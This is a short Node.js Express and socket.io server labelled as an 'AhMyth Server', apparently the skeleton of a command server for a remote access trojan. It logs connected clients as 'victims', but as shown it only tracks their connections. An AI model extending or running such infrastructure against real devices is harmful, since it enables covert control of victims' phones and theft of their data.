const express = require('express');
const http = require('http');
const socketIo = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

// Victims management
let victims = [];

// Connection handling
io.on('connection', (socket) => {
    console.log('A victim connected: ' + socket.id);
    victims.push(socket.id);

    socket.on('disconnect', () => {
        console.log('A victim disconnected: ' + socket.id);
        victims = victims.filter(v => v !== socket.id);
    });
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('SIGTERM signal received: closing HTTP server');
    server.close(() => {
        console.log('HTTP server closed');
        // Close any other resources here e.g., database connection
        process.exit(0);
    });
});

app.get('/', (req, res) => {
    res.send('AhMyth Server is running!');
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server is listening on port ${PORT}`);
});
